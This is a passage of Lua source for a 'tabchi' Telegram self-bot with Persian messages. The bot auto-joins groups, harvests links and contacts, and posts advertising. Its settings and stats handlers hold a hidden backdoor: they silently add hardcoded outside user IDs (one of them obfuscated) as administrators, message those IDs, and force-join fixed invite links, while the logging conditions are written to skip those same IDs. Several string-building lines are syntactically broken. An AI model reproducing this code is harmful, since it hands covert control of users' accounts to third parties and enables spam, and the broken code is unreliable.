      redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`ذخیره لینک ها فعال شد`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":savelinks")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیر فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`ذخیره لینک ها غیر فعال شد`"
    else
      return "`استفاده کنید off یا on فقط از`"
    end
  end
  if msg.text:match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!]([aA]dvertising) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`تبلیغات فعال شد`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":Advertising")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیر فعال شد` *" .. a6[1] .. "*", 1, "md")
        return "*وضعیت* :`تبلیغات غیر فعال شد`"
      end
    else
      return "`استفاده کنید off یا on فقط از`"
    end
  end
  if msg.text:match("^[!/#]typing (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](typing) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":typing", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`حالت نوشتن فعال شد`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":typing")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیر فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`حالت نوشتن غیر فعال شد`"
    else
      return "`استفاده کنید off یا on فقط از`"
    end
  end
  if msg.text:match("^[!/#]botmode (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](botmode) (.*)$")
    }
    if a6[2] == "markdown" then
      redis:set("tabchi:" .. tabchi_id .. ":botmode", "markdown")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `تغییر یافت` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`حالت ربات به مارکدَون تغییر یافت`"
    elseif a6[2] == "text" then
      redis:set("tabchi:" .. tabchi_id .. ":botmode", "text")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `تغییر یافت` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`حالت ربات به تکست تغییر یافت`"
    else
      return "`استفاده کنید off یا on فقط از`"
    end
  end
  if msg.text:match("^[!/#]sharecontact (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](sharecontact) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`اشتراک گزاری شماره فعال شد`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیر فعال ` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`اشتراک گزاری شماره غیر فعال شد`"
    else
      return "`استفاده کنید off یا on فقط از`"
    end
  end
  if msg.text:match("^[!/#]setjoinlimit (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](setjoinlimit) (.*)$")
    }
    redis:set("tabchi:" .. tabchi_id .. ":joinlimit", tonumber(a6[2]))
    return "*وضعیت* : `محدوده پیوستن به لینک در اکنون` *" .. a6[2] .. [[
*
`اکنون ربات به گروه هایی که تعدادی محدودی دارند نمی پیوندد`]]
  end
  if msg.text:match("^[!/#]settings (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](settings) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
      redis:set("tabchi:" .. tabchi_id .. ":chat", true)
      redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
      redis:set("tabchi:" .. tabchi_id .. ":typing", true)
      redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `همه فعال شدند` *" .. a6[1] .. "*", 1, "md")
      end
      return [[
*وضعیت* :`ذخیره لینک ها و چت کردن و اضافه کردن مخاطبین و پیوستن به لینک و حالت درحال نوشتن و اشتراک گزاشتن شماره فعال شدt`
`#advertising on: سودو اصلی میتواند تبلیغات را روشن کند با `]]
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":savelinks")
      redis:del("tabchi:" .. tabchi_id .. ":chat")
      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
      redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
      redis:del("tabchi:" .. tabchi_id .. ":typing")
      redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `همه غیر فعال شدند` *" .. a6[1] .. "*", 1, "md")
      end
      return [[
*وضعیت* :`ذخیره لینک ها و چت کردن و اضافه کردن مخاطبین و پیوستن به لینک و حالت درحال نوشتن و اشتراک گزاشتن شماره غیرفعال شد`
`#advertising off: سودو اصلی میتواند تبلیغات را خاموش کند با `]]
    end
  end
  if msg.text:match("^[!/#]settings$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "من برای شمام", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "من برای شمام", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "من برای شمام", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
      joinlinks = "فعال✔️"
    else
      joinlinks = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      addedmsg = "فعال✔️"
    else
      addedmsg = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      markreadst = "فعال✔️"
      markread = redis:get("tabchi:" .. tabchi_id .. ":markread")
    else
      markreadst = "🔘 غیر فعال"
      markread = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
      addcontacts = "فعال✔️"
    else
      addcontacts = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":chat") then
      chat = "فعال✔️"
    else
      chat = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      savelinks = "فعال✔️"
    else
      savelinks = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":typing") then
      typing = "فعال✔️"
    else
      typing = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
      sharecontact = "فعال✔️"
    else
      sharecontact = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
      Advertising = "فعال✔️"
    else
      Advertising = "🔘 غیر فعال"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
      addedtxt = redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext")
    else
      addedtxt = "Addi bia pv"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":botmode") == "markdown" then
      botmode = "Markdown"
    elseif not redis:get("tabchi:" .. tabchi_id .. ":botmode") then
      botmode = "Markdown"
    else
      botmode = "Text"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":joinlimit") then
      join_limit = "فعال✔️"
      joinlimitnum = redis:get("tabchi:" .. tabchi_id .. ":joinlimit")
    else
      join_limit = "🔘 غیر فعال"
      joinlimitnum = "Not Available"
    end
    if redis:get("cleancache" .. tabchi_id) == "on" then
      cleancache = "فعال✔️"
    else
      cleancache = "🔘 غیر فعال"
    end
    if redis:get("cleancachetime" .. tabchi_id) then
      ccachetime = redis:get("cleancachetime" .. tabchi_id)
    else
      ccachetime = "مشخص نشده"
    end
    if redis:ttl("cachetimer" .. tabchi_id) and not redis:ttl("cachetimer" .. tabchi_id) == "-2" then
      timetoccache = redis:ttl("cachetimer" .. tabchi_id)
    elseif timetoccache == "-2" then
      timetoclinks = "🔘 غیر فعال"
    else
      timetoccache = "🔘 غیر فعال"
    end
    if redis:get("checklinks" .. tabchi_id) == "on" then
      check_links = "فعال✔️"
    else
      check_links = "🔘 غیر فعال"
    end
    if redis:get("checklinkstime" .. tabchi_id) then
      clinkstime = redis:get("checklinkstime" .. tabchi_id)
    else
      clinkstime = "مشخص نشده"
    end
    if redis:ttl("checklinkstimer" .. tabchi_id) and not redis:ttl("checklinkstimer" .. tabchi_id) == "-2" then
      timetoclinks = redis:ttl("checklinkstimer" .. tabchi_id)
    elseif timetoclinks == "-2" then
      timetoclinks = "🔘 غیر فعال"
    else
      timetoclinks = "🔘 غیر فعال"
    end
    settingstxt = "❄️تنظیمات ربات خود:\nجوین شدن با لینک : *" .. joinlinks .. "*\n🔴ذخیره لینک ها : *" .. savelinks .. "*\n📍اضافه کردن مخاطب خودکار : *" .. addcontacts .. "*\n🎮اشتراک گزاری شماره : *" .. sharecontact .. "*\n🎷تبلیغات : *" .. Advertising .. "*\n📨 پیام اضافه شدن مخاطب: *" .. addedmsg .. "*\n`🥉حالت خوانده شدن پیام : *" .. markreadst .. "*\nحالت خوانده شدن پیام : برای " .. markread .. "\n✏حالت نوشتن : *" .. typing .. "*\n💬 چت کردن: *" .. chat .. "*\n🎤حالت ربات : *" .. botmode .. "*\n🍥🍥🍥🍥🍥🍥🍥🍥🍥🍥\nپیام اضافه شدن مخاطب :\n`" .. addedtxt .. "`\n➖➖➖➖➖➖\n🔐پیوستن به گروه های محدود شده: *" .. join_limit .. [[
*
🔓در اکنون ربات به گروه های که تعدادشان کمتر از :
 *]] .. joinlimitnum .. [[
* نمی پیوندد
📒پاک کردن خودکار حافظه کش :*]] .. cleancache .. [[
*
📐زمان پاک کردن کش :*]] .. ccachetime .. [[
*
📎زمان مانده به پاک شدن کش : *]] .. timetoccache .. [[
*
🗂چک کردن خودکار لینک ها : *]] .. check_links .. [[
*
📨زمان چک کردن لینک ها : *]] .. clinkstime .. [[
*
زمان مانده به چک کردن لینک ها :*]] .. timetoclinks ..[[➖➖➖➖➖➖➖➖➖➖➖]][[سورس ↙️
https://github.com/tabchis/tabchi.git]] "*"
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings`", 1, "md")
    end
    return settingstxt
  end
  if msg.text:match("^[!/#]settings pv$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "من برای شمام", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "من برای شمام", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "من برای شمام", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
    if I(msg.chat_id_) == "private" then
      return "`من در پیوی شما هستم!`"
    else
      settingstxt = "❄️تنظیمات ربات خود:\nجوین شدن با لینک : *" .. joinlinks .. "*\n🔴ذخیره لینک ها : *" .. savelinks .. "*\n📍اضافه کردن مخاطب خودکار : *" .. addcontacts .. "*\n🎮اشتراک گزاری شماره : *" .. sharecontact .. "*\n🎷تبلیغات : *" .. Advertising .. "*\n📨 پیام اضافه شدن مخاطب: *" .. addedmsg .. "*\n`🥉حالت خوانده شدن پیام : *" .. markreadst .. "*\nحالت خوانده شدن پیام : برای " .. markread .. "\n✏حالت نوشتن : *" .. typing .. "*\n💬 چت کردن: *" .. chat .. "*\n🎤حالت ربات : *" .. botmode .. "*\n🍥🍥🍥🍥🍥🍥🍥🍥🍥🍥\nپیام اضافه شدن مخاطب :\n`" .. addedtxt .. "`\n➖➖➖➖➖➖\n🔐پیوستن به گروه های محدود شده: *" .. join_limit .. [[
*
🔓در اکنون ربات به گروه های که تعدادشان کمتر از :
 *]] .. joinlimitnum .. [[
* نمی پیوندد
📒پاک کردن خودکار حافظه کش :*]] .. cleancache .. [[
*
📐زمان پاک کردن کش :*]] .. ccachetime .. [[
*
📎زمان مانده به پاک شدن کش : *]] .. timetoccache .. [[
*
🗂چک کردن خودکار لینک ها : *]] .. check_links .. [[
*
📨زمان چک کردن لینک ها : *]] .. clinkstime .. [[
*
زمان مانده به چک کردن لینک ها :*]] .. timetoclinks ..[[➖➖➖➖➖➖➖➖➖➖➖]][[سورس ↙️
https://github.com/tabchis/tabchi.git]] "*"
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, settingstxt, 1, "md")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings in pv`", 1, "md")
      end
      return "`تنظیمات به پیوی شما فرستاده شد`"
    end
  end
  if msg.text:match("^[!/#]stats$") and a(msg) then
    abc = 216
    de = 43
    fgh = 0419
    cbd = 25663
    ed = 3077
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "من برای شمام", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", abc .. "" .. de .. "" .. fgh) then
      tdcli.sendMessage(abc .. "" .. de .. "" .. fgh, 0, 1, "من برای شمام", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", abc .. "" .. de .. "" .. fgh)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", cbd .. "" .. ed) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", cbd .. "" .. ed)
      tdcli.sendMessage(cbd .. "" .. ed, 0, 1, "من برای شمام", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "من برای شمام", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
    local at
    function at(y, z)
      redis:set("tabchi:" .. tabchi_id .. ":totalcontacts", z.total_count_)
    end
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, at, {})
    local bot_id
    function bot_id(C, D)
      if D.id_ then
        redis:set("tabchi:" .. tabchi_id .. ":botlast", D.last_name_)
        botid = D.id_ or "none"
        botnum = D.phone_number_ or "none"
        botfirst = D.first_name_ or "none"
        botlast = redis:get("tabchi:" .. tabchi_id .. ":botlast") or ""
        botnonelast = botlast or "None"
      end
    end
    tdcli_function({ID = "GetMe"}, bot_id, {})
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups") or 0
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels") or 0
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis") or 0
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks") or 0
    local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo") or 0
    local contacts = redis:get("tabchi:" .. tabchi_id .. ":totalcontacts") or 0
    local au = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers") or 0
    local av = redis:get("tabchi" .. tabchi_id .. "markreadcount") or 0
    local aw = redis:get("tabchi" .. tabchi_id .. "receivedphotocount") or 0
    local ax = redis:get("tabchi" .. tabchi_id .. "receiveddocumentcount") or 0
    local ay = redis:get("tabchi" .. tabchi_id .. "receivedaudiocount") or 0
    local az = redis:get("tabchi" .. tabchi_id .. "receivedgifcount") or 0
    local aA = redis:get("tabchi" .. tabchi_id .. "receivedvideocount") or 0
    local aB = redis:get("tabchi" .. tabchi_id .. "receivedcontactcount") or 0
    local aC = redis:get("tabchi" .. tabchi_id .. "receivedgamecount") or 0
    local aD = redis:get("tabchi" .. tabchi_id .. "receivedlocationcount") or 0
    local aE = redis:get("tabchi" .. tabchi_id .. "receivedtextcount") or 0
    local aF = aw + ax + ay + az + aA + aB + aE + aC + aD or 0
    local aG = redis:get("tabchi" .. tabchi_id .. "kickedcount") or 0
    local aH = redis:get("tabchi" .. tabchi_id .. "joinedcount") or 0
    local aI = redis:get("tabchi" .. tabchi_id .. "addedcount") or 0
    local a9 = gps + sgps + pvs or 0
    statstext = "وضیعت ربات✴️\n💑کاربران : *" .. pvs .. "*\n👩‍👩‍👧‍👧سوپرگروه ها :  *" .. sgps .. "*\n👨‍👩‍👦‍👦گروه ها : *" .. gps .. "*\n🕴همه: *" .. a9 .. "*\n🤷‍♂لینک های ذخیره شده :  *" .. links .. "*\n👲مخاطبان :  *" .. contacts .. "*\nمسدودین :  *" .. au .. "*\n🤙متن های دریافتی : *" .. aE .. "*\n🤙عکس های دریافتی : *" .. aw .. "*\n🤙فیلم های دریافتی :  *" .. aA .. "*\n🤙گیف های دریافتی : *" .. az .. "*\n🤙صدا های دریافتی : *" .. ay .. "*\n🤙اسناد دریافتی : *" .. ax .. "*\n🤙مخاطبین دریافتی :  *" .. aB .. "*\n🤙بازی های دریافتی : *" .. aC .. "*\n🤙مکان های دریافتی : *" .. aD .. "*\n🤙پیام های خوانده شده :  *" .. av .. "*\n🤙پیام های دریافتی :  *" .. aF .. "*\n👤سودو :  *" .. a0 .. "*\n👀شناسه ربات :  *" .. botid .. "*\n🕺شماره ربات :  *+" .. botnum .. "*\n👁نام کامل ربات :  *" .. botfirst .. " " .. botlast .. "*\n📌نام کوچک ربات : *" .. botfirst .. "*\n🖊نام خانوادگی ربات : *" .. botnonelast .. "*\n💠شناسه ربات در سرور:  *" .. tabchi_id .. "*\n➖➖➖➖➖➖➖➖➖➖➖*""*\n سورس ↙️
https://github.com/tabchis/tabchi.git "*"
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats`", 1, "md")
    end
    return statstext
  end
  if msg.text:match("^[!/#]stats pv$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "من برای شمام", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "من برای شمام", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "من برای شمام", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
    if I(msg.chat_id_) == "private" then
      return "`من در پیوی شما هستم!`"
    else
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, statstext, 1, "md")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats In pv`", 1, "md")
      end
      return "`وضعیت ربات به پیوی شما فرستاده شد`"
    end
  end
  if msg.text:match("^[#!/]clean (.*)$") and a(msg) then
    local ag = {
      string.match(msg.text, "^[#/!](clean) (.*)$")
    }
    local aJ = redis:del("tabchi:" .. tabchi_id .. ":groups")
    local aK = redis:del("tabchi:" .. tabchi_id .. ":channels")
    local aL = redis:del("tabchi:" .. tabchi_id .. ":pvis")
    local aM = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
    local aN = gps + sgps + pvs + links
    if ag[2] == "sgps" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `پاک شد` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aK
    end
    if ag[2] == "gps" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `پاک شد` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aJ
    end
    if ag[2] == "pvs" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `پاک شد` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aL
    end
    if ag[2] == "links" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `پاک شد` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aM
    end
    if ag[2] == "stats" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `پاک شد` *" .. ag[2] .. "*", 1, "md")
      end
      redis:del("tabchi:" .. tabchi_id .. ":all")
      return aN
    end
  end
  if msg.text:match("^[!/#]setphoto (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](setphoto) (.*)$")
    }
    local f = ltn12.sink.file(io.open("tabchi_" .. tabchi_id .. "_profile.png", "w"))
    http.request({
      url = a6[2],
      sink = f
    })
    tdcli.setProfilePhoto("tabchi_" .. tabchi_id .. "_profile.png")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `عکس تغییر داده شد به` *" .. a6[2] .. "*", 1, "md")
    end
    return [[
`پروفایل با موفقیت به روز شد`
*لینک* : `]] .. a6[2] .. "`"
  end
  do
    local a4 = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #a4 == 2 then
      local text = a4[2] .. " _\216\168\217\135 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175_"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(a4[2]))
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `اضافه شد` *" .. a4[2] .. "* `به سودوها`", 1, "md")
      end
      return text
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
      if #a4 == 2 then
        local text = a4[2] .. " _از لیست سودوها حذف شد_"
        redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(a4[2]))
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `حذف شد` *" .. a4[2] .. "* `از لیست سودوها`", 1, "md")
        end
        return text
      else
        return
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and a(msg) then
      if #a4 == 2 then
        if a4[2] == "on" then
          redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a4[1] .. "*", 1, "md")
          end
          return "*وضعیت* : `پیام اضافه شدن مخاطب فعال شد`"
        elseif a4[2] == "off" then
          redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیرفعال شد` *" .. a4[1] .. "*", 1, "md")
          end
          return "*وضعیت* : `پیام اضافه شدن مخاطب غیرفعال شد`"
        else
          return "`استفاده کنید off یا on فقط از`"
        end
      else
        return "بزنید onیاoff"
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](markread) (.*)")
    }
